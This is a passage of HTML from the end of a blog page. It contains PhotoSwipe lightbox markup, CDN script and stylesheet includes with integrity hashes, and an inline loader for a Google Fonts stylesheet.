+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
